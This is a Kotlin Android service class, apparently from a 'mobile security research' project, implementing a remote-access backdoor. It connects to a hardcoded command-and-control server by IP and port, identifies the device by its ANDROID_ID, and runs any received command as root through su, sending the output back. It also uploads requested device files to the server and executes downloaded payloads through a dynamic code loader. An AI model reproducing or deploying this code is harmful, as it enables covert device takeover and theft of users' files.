package com.example.mobsec_823

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader

class RootService : Service() {
    private var c2Connection: C2Connection? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private val TAG = "RootService"
    private val serverIp = "47.129.144.9"
    private val serverPort = 1269

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        checkRootAvailability()
        initC2Connection()
    }

    private fun startForegroundService() {
        val channelId = "RootServiceChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Root Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("MobSec Research Active")
            .setContentText("Monitoring for C2 commands...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()

        startForeground(1, notification)
    }

    private fun checkRootAvailability() {
        serviceScope.launch {
            try {
                val process = Runtime.getRuntime().exec("which su")
                val path = BufferedReader(InputStreamReader(process.inputStream)).readLine()
                if (path != null) {
                    Log.i(TAG, "Root binary found at: $path")
                } else {
                    Log.e(TAG, "CRITICAL: 'su' binary NOT found in PATH")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for su", e)
            }
        }
    }

    private fun initC2Connection() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        c2Connection = C2Connection(this, serverIp, serverPort, deviceId, object : C2Connection.CommandListener {
            override fun onCommandReceived(command: String) {
                if (command.startsWith("SYNC_FILE:")) {
                    val path = command.removePrefix("SYNC_FILE:").trim()
                    if (path.isNotEmpty()) {
                        FileSync.uploadFile(this@RootService, serverIp, deviceId, path)
                    }
                } else {
                    executeAsRoot(command)
                }
            }

            override fun onPayloadReceived(filePath: String) {
                Log.i(TAG, "Payload received. Initiating dynamic code execution.")
                DynamicCodeLoader.executePayload(this@RootService, filePath)
            }
        })
        c2Connection?.start()
    }

    private fun executeAsRoot(command: String) {
        serviceScope.launch {
            val result = try {
                val process = Runtime.getRuntime().exec("su")
                process.outputStream.bufferedWriter().use { writer ->
                    writer.write(command + "\n")
                    writer.write("exit\n")
                    writer.flush()
                }

                val output = process.inputStream.bufferedReader().readText()
                val exitVal = process.waitFor()

                if (exitVal == 0) {
                    "SUCCESS: $output"
                } else {
                    "FAILED (Exit $exitVal): $output"
                }
            } catch (e: Exception) {
                Log.e(TAG, "Execution error", e)
                "EXECUTION ERROR: ${e.message}"
            }
            
            Log.d(TAG, "Result: $result")
            result.split("\n").forEach { line ->
                c2Connection?.sendData("OUT:$line")
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        c2Connection?.stop()
    }
}
